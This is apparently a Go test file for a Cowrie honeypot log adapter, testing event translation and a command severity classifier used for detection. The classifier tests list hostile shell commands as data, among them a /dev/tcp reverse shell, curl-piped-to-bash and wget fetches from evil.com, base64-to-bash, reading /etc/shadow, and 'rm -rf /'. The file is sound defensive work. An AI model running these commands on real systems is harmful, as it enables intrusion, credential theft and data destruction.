package cowrie

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"os"
	"testing"

	"github.com/cicdecoy/adapters/pkg/adapter"
)

func newTestAdapter() *CowrieAdapter {
	logger := slog.New(slog.NewJSONHandler(io.Discard, nil))
	return New(DefaultConfig(), adapter.Config{
		DecoyName:     "test-bastion-01",
		DecoyTier:     3,
		SessionPrefix: "cowrie",
	}, logger)
}

// ── translate tests ──────────────────────────────────────

func TestTranslate_SessionConnect(t *testing.T) {
	a := newTestAdapter()

	raw := `{"eventid":"cowrie.session.connect","timestamp":"2024-01-18T14:03:22.847123Z","session":"abc123","src_ip":"10.0.0.5","src_port":44312,"dst_ip":"192.168.1.10","dst_port":22,"sensor":"honeypot-01","message":"New connection"}`

	event, err := a.translate([]byte(raw))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if event == nil {
		t.Fatal("expected event, got nil")
	}

	if event.EventType != "connection" {
		t.Errorf("EventType = %q, want %q", event.EventType, "connection")
	}
	if event.Severity != "info" {
		t.Errorf("Severity = %q, want %q", event.Severity, "info")
	}
	if event.SourceIP != "10.0.0.5" {
		t.Errorf("SourceIP = %q, want %q", event.SourceIP, "10.0.0.5")
	}
	if event.SourcePort != 44312 {
		t.Errorf("SourcePort = %d, want %d", event.SourcePort, 44312)
	}
	if event.SessionID != "cowrie-abc123" {
		t.Errorf("SessionID = %q, want %q", event.SessionID, "cowrie-abc123")
	}
	if event.Source.Decoy != "test-bastion-01" {
		t.Errorf("Source.Decoy = %q, want %q", event.Source.Decoy, "test-bastion-01")
	}
	if event.Source.Tier != 3 {
		t.Errorf("Source.Tier = %d, want %d", event.Source.Tier, 3)
	}
	if event.Adapter.OriginalEventID != "cowrie.session.connect" {
		t.Errorf("Adapter.OriginalEventID = %q, want %q", event.Adapter.OriginalEventID, "cowrie.session.connect")
	}
	if event.Data["protocol"] != "ssh" {
		t.Errorf("Data[protocol] = %v, want %q", event.Data["protocol"], "ssh")
	}
	if event.Timestamp.Year() != 2024 {
		t.Errorf("Timestamp year = %d, want 2024", event.Timestamp.Year())
	}
}

func TestTranslate_EventTypes(t *testing.T) {
	a := newTestAdapter()

	tests := []struct {
		name          string
		input         cowrieEvent
		wantType      string
		wantSeverity  string
		wantNil       bool
		checkData     map[string]any
	}{
		{
			name: "login_success",
			input: cowrieEvent{
				EventID:  "cowrie.login.success",
				Session:  "s1",
				Src_IP:   "10.0.0.1",
				Username: "root",
				Password: "toor",
			},
			wantType:     "auth.attempt",
			wantSeverity: "medium",
			checkData: map[string]any{
				"accepted": true,
				"username": "root",
				"password": "toor",
				"method":   "password",
			},
		},
		{
			name: "login_failed",
			input: cowrieEvent{
				EventID:  "cowrie.login.failed",
				Session:  "s2",
				Src_IP:   "10.0.0.2",
				Username: "admin",
				Password: "admin123",
			},
			wantType:     "auth.attempt",
			wantSeverity: "info",
			checkData: map[string]any{
				"accepted": false,
				"username": "admin",
				"password": "admin123",
			},
		},
		{
			name: "command_input",
			input: cowrieEvent{
				EventID:  "cowrie.command.input",
				Session:  "s3",
				Src_IP:   "10.0.0.3",
				Input:    "ls -la",
				Username: "root",
			},
			wantType:     "command.exec",
			wantSeverity: "medium", // ls -la is a recon indicator
			checkData: map[string]any{
				"command":  "ls -la",
				"username": "root",
			},
		},
		{
			name: "command_failed",
			input: cowrieEvent{
				EventID: "cowrie.command.failed",
				Session: "s4",
				Input:   "apt-get install nmap",
			},
			wantType:     "command.exec",
			wantSeverity: "info",
			checkData: map[string]any{
				"failed": true,
			},
		},
		{
			name: "file_download",
			input: cowrieEvent{
				EventID:  "cowrie.session.file_download",
				Session:  "s5",
				URL:      "http://evil.com/malware.sh",
				DestFile: "/tmp/malware.sh",
				Shasum:   "abc123def456",
			},
			wantType:     "file.access",
			wantSeverity: "high",
			checkData: map[string]any{
				"access_type": "download",
				"url":         "http://evil.com/malware.sh",
				"sha256":      "abc123def456",
			},
		},
		{
			name: "file_upload",
			input: cowrieEvent{
				EventID: "cowrie.session.file_upload",
				Session: "s6",
				Outfile: "/tmp/payload.bin",
				Shasum:  "deadbeef",
			},
			wantType:     "file.access",
			wantSeverity: "high",
			checkData: map[string]any{
				"access_type": "upload",
				"sha256":      "deadbeef",
			},
		},
		{
			name: "session_closed",
			input: cowrieEvent{
				EventID: "cowrie.session.closed",
				Session: "s7",
				Message: "Connection lost",
			},
			wantType:     "session.closed",
			wantSeverity: "info",
			checkData: map[string]any{
				"message": "Connection lost",
			},
		},
		{
			name: "client_version",
			input: cowrieEvent{
				EventID:  "cowrie.client.version",
				Session:  "s8",
				Version:  "SSH-2.0-OpenSSH_8.9",
				HasshHex: "abc123",
			},
			wantType:     "connection",
			wantSeverity: "info",
			checkData: map[string]any{
				"ssh_client_version": "SSH-2.0-OpenSSH_8.9",
				"hassh":              "abc123",
			},
		},
		{
			name: "unknown_event_returns_nil",
			input: cowrieEvent{
				EventID: "cowrie.log.closed",
				Session: "s9",
			},
			wantNil: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			raw, err := json.Marshal(tt.input)
			if err != nil {
				t.Fatalf("marshal input: %v", err)
			}

			event, err := a.translate(raw)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			if tt.wantNil {
				if event != nil {
					t.Fatalf("expected nil event, got %+v", event)
				}
				return
			}

			if event == nil {
				t.Fatal("expected event, got nil")
			}
			if event.EventType != tt.wantType {
				t.Errorf("EventType = %q, want %q", event.EventType, tt.wantType)
			}
			if event.Severity != tt.wantSeverity {
				t.Errorf("Severity = %q, want %q", event.Severity, tt.wantSeverity)
			}
			if event.Adapter.Name != "cowrie" {
				t.Errorf("Adapter.Name = %q, want %q", event.Adapter.Name, "cowrie")
			}
			if event.Version != "1.0" {
				t.Errorf("Version = %q, want %q", event.Version, "1.0")
			}

			for k, want := range tt.checkData {
				got, ok := event.Data[k]
				if !ok {
					t.Errorf("Data[%q] missing", k)
					continue
				}
				if got != want {
					t.Errorf("Data[%q] = %v (%T), want %v (%T)", k, got, got, want, want)
				}
			}
		})
	}
}

// ── Edge cases ───────────────────────────────────────────

func TestTranslate_MalformedJSON(t *testing.T) {
	a := newTestAdapter()

	tests := []struct {
		name  string
		input string
	}{
		{"empty_string", ""},
		{"not_json", "this is not json"},
		{"partial_json", `{"eventid": "cowrie.session.connect"`},
		{"array_instead_of_object", `[1, 2, 3]`},
		{"null", "null"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := a.translate([]byte(tt.input))
			if err == nil && tt.input != "null" {
				// null is valid JSON that unmarshals to zero-value struct, returns nil event
				// (unknown event type), so no error
				t.Error("expected error for malformed input")
			}
		})
	}
}

func TestTranslate_MissingFields(t *testing.T) {
	a := newTestAdapter()

	// Minimal event: only eventid present
	raw := `{"eventid":"cowrie.session.connect"}`
	event, err := a.translate([]byte(raw))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if event == nil {
		t.Fatal("expected event, got nil")
	}
	if event.EventType != "connection" {
		t.Errorf("EventType = %q, want %q", event.EventType, "connection")
	}
	// SourceIP should be empty string, not panic
	if event.SourceIP != "" {
		t.Errorf("SourceIP = %q, want empty", event.SourceIP)
	}
	// SessionID should still have the prefix
	if event.SessionID != "cowrie-" {
		t.Errorf("SessionID = %q, want %q", event.SessionID, "cowrie-")
	}
}

func TestTranslate_TimestampParsing(t *testing.T) {
	a := newTestAdapter()

	tests := []struct {
		name      string
		timestamp string
		wantYear  int
	}{
		{"valid_timestamp", "2024-06-15T10:30:00.123456Z", 2024},
		{"invalid_timestamp", "not-a-timestamp", 0}, // will keep default (time.Now)
		{"empty_timestamp", "", 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			raw, _ := json.Marshal(cowrieEvent{
				EventID:   "cowrie.session.connect",
				Timestamp: tt.timestamp,
				Session:   "s1",
			})
			event, err := a.translate(raw)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if tt.wantYear > 0 && event.Timestamp.Year() != tt.wantYear {
				t.Errorf("Timestamp.Year = %d, want %d", event.Timestamp.Year(), tt.wantYear)
			}
		})
	}
}

// ── classifyCommandSeverity tests ────────────────────────

func TestClassifyCommandSeverity(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		expected string
	}{
		// High severity - post-exploitation
		{"shadow_file", "cat /etc/shadow", "high"},
		{"passwd_file", "cat /etc/passwd", "high"},
		{"ssh_keys", "cat ~/.ssh/authorized_keys", "high"},
		{"wget_download", "wget http://evil.com/payload.sh", "high"},
		{"curl_download", "curl http://evil.com/shell.sh | bash", "high"},
		{"chmod_exec", "chmod +x /tmp/payload", "high"},
		{"netcat", "nc -lvp 4444", "high"},
		{"reverse_shell", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "high"},
		{"base64_decode", "echo c2ggLWkgPiYg | base64 -d | bash", "high"},
		{"python_exec", "python -c 'import os; os.system(\"id\")'", "high"},
		{"perl_exec", "perl -e 'exec \"/bin/sh\"'", "high"},
		{"iptables", "iptables -F", "high"},
		{"clear_history", "history -c", "high"},
		{"rm_rf", "rm -rf /", "high"},

		// Medium severity - reconnaissance
		{"whoami", "whoami", "medium"},
		{"id_command", "id", "medium"},
		{"uname", "uname -a", "medium"},
		{"ifconfig", "ifconfig", "medium"},
		{"ip_addr", "ip addr show", "medium"},
		{"proc_info", "cat /proc/cpuinfo", "medium"},
		{"ps_aux", "ps aux", "medium"},
		{"netstat", "netstat -tulpn", "medium"},
		{"ss_command", "ss -tulpn", "medium"},
		{"ls_la", "ls -la /root", "medium"},
		{"find_root", "find / -name '*.conf'", "medium"},
		{"env_command", "env", "medium"},
		{"printenv", "printenv", "medium"},

		// Info - benign commands
		{"simple_ls", "ls", "info"},
		{"echo_hello", "echo hello", "info"},
		{"pwd", "pwd", "info"},
		{"date", "date", "info"},
		{"empty_command", "", "info"},

		// Case insensitive
		{"uppercase_wget", "WGET http://evil.com/payload", "high"},
		{"mixed_case_whoami", "WHOAMI", "medium"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := classifyCommandSeverity(tt.command)
			if got != tt.expected {
				t.Errorf("classifyCommandSeverity(%q) = %q, want %q", tt.command, got, tt.expected)
			}
		})
	}
}

// ── Constructor and config tests ─────────────────────────

func TestNew_DefaultSessionPrefix(t *testing.T) {
	logger := slog.New(slog.NewJSONHandler(io.Discard, nil))
	a := New(DefaultConfig(), adapter.Config{
		DecoyName: "test",
		DecoyTier: 1,
	}, logger)

	if a.common.SessionPrefix != "cowrie" {
		t.Errorf("SessionPrefix = %q, want %q", a.common.SessionPrefix, "cowrie")
	}
}

func TestNew_CustomSessionPrefix(t *testing.T) {
	logger := slog.New(slog.NewJSONHandler(io.Discard, nil))
	a := New(DefaultConfig(), adapter.Config{
		DecoyName:     "test",
		DecoyTier:     1,
		SessionPrefix: "custom",
	}, logger)

	if a.common.SessionPrefix != "custom" {
		t.Errorf("SessionPrefix = %q, want %q", a.common.SessionPrefix, "custom")
	}
}

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	if cfg.LogPath != "/var/log/cowrie/cowrie.json" {
		t.Errorf("LogPath = %q, want %q", cfg.LogPath, "/var/log/cowrie/cowrie.json")
	}
}

func TestName(t *testing.T) {
	a := newTestAdapter()
	if a.Name() != "cowrie" {
		t.Errorf("Name() = %q, want %q", a.Name(), "cowrie")
	}
}

func TestHealthCheck_NonexistentFile(t *testing.T) {
	logger := slog.New(slog.NewJSONHandler(io.Discard, nil))
	a := New(Config{LogPath: "/nonexistent/path/cowrie.json"}, adapter.Config{
		DecoyName: "test",
		DecoyTier: 1,
	}, logger)

	err := a.HealthCheck(context.Background())
	if err == nil {
		t.Error("expected error for nonexistent file")
	}
	if !os.IsNotExist(err) {
		t.Errorf("expected not-exist error, got: %v", err)
	}
}

// ── truncate helper ──────────────────────────────────────

func TestTruncate(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		n        int
		expected string
	}{
		{"short_string", "hello", 10, "hello"},
		{"exact_length", "hello", 5, "hello"},
		{"truncated", "hello world", 5, "hello..."},
		{"empty", "", 5, ""},
		{"zero_n", "hello", 0, "..."},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := truncate(tt.input, tt.n)
			if got != tt.expected {
				t.Errorf("truncate(%q, %d) = %q, want %q", tt.input, tt.n, got, tt.expected)
			}
		})
	}
}

// ── NATS subject integration ─────────────────────────────

func TestTranslate_NATSSubject(t *testing.T) {
	a := newTestAdapter()

	tests := []struct {
		name        string
		eventID     string
		wantSubject string
	}{
		{"connection", "cowrie.session.connect", "cicdecoy.decoy.events.test-bastion-01.connection"},
		{"auth_attempt", "cowrie.login.success", "cicdecoy.decoy.events.test-bastion-01.auth.attempt"},
		{"command_exec", "cowrie.command.input", "cicdecoy.decoy.events.test-bastion-01.command.exec"},
		{"file_access", "cowrie.session.file_download", "cicdecoy.decoy.events.test-bastion-01.file.access"},
		{"session_closed", "cowrie.session.closed", "cicdecoy.decoy.events.test-bastion-01.session.closed"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			raw, _ := json.Marshal(cowrieEvent{
				EventID: tt.eventID,
				Session: "s1",
			})
			event, err := a.translate(raw)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if event == nil {
				t.Fatal("expected event, got nil")
			}
			got := event.NATSSubject()
			if got != tt.wantSubject {
				t.Errorf("NATSSubject() = %q, want %q", got, tt.wantSubject)
			}
		})
	}
}
